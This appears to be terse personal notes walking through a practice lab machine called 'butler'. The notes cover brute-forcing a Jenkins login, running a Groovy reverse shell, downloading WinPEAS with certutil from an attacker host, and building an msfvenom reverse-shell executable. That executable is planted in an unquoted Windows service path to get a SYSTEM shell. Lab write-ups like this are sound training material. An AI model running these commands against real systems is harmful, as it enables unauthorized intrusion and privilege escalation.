butler walkthrough
========================

1. nmap shows samba (?), webserver on 8080 and unknown port 5040, also 7060 pando pub?? 
2. port 8080 is a jenkins server, cant really find version... looking at exploits we can see RCEs but we have to be authenticated
3. go to burp and make an intruder attack of type cluster bomb (tries all combinations of user/password as opposed to pitchfork). since cluster bomb is so dense we should try easy password combinations first (admin, jenkins, user...) (password, jenkins, Password...)
4. running these we see a slight length increase in jenkins/jenkins and forward... really subtle change of cookies, perhaps this is an indicator of successful login. trying it, it works!
5. in jenkins you can access a cli, a script manager, etc. script is in groovy, there's a groovy reverse shell script
6. listen to a port in netcat, put the correct attacker ip and port in the script and run... now we have access to the machine as user `butler`
7. just as there's linpeas, there's winpeas, so we can download the exe of that and put it into the transfer folder, then start the server with python
8. `certutil -urlcache -f http://10.0.2.15/winpeas.exe winpeas.exe` to get the file, maybe we can put it in butler's home folder
9. run and find something: process `WiseBootAssistant` that runs `C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe` has "No quotes and Space detected". this means that windows will look for a file in every space terminator possible (`C:\Program.exe`, `C:\Program Files (x86)\Wise\Wise.exe`, etc)
10. craft reverse shell malware with msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=7777 -f exe -o Wise.exe`. put it in the transfer folder and restart server
11. certutil it on the Wise folder as Wise.exe, don't run it yet because we will get a shell as butler, but we want a system shell!
12. also listen to the 7777 port with netcat
12. we need to stop and restart the service. since it's called `WiseBootAssistant`, do `sc stop WiseBootAssistant` and `sc start WiseBootAssistant`. starting the process will run the program as system, and we will have a system shell!